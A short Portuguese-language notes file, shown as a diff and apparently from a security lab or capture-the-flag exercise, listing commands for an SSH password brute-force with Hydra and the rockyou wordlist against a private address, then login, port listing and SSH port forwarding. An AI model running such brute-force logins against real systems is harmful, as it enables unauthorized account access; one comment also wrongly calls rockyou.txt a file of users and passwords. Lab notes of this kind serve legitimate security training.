@@ -1,0 +1,23 @@
+ataque de força bruta no servidor
+--> cd /usr/share/wordlists
+
+--> ls
+
+--> hydra -l aluno -P rockyou.txt 192.168.10.10 ssh
+    aluno = usuário
+    rockyou.txt = arquivo com usuários e senhas
+	
+--> ssh aluno@192.168.10.10
+
+--> ss -nltp 
+	para verificar as portas abertas
+	
+--> ssh -L 7070:localhost:7070 aluno@192.168.10.10
+		porta de entrada:localhost:porta de saida
+
+para descompactar
+--> gunzip -d <arquivo>
+
+para mostrar quantidade de linhas
+--> wc -l rockyou.txt
+
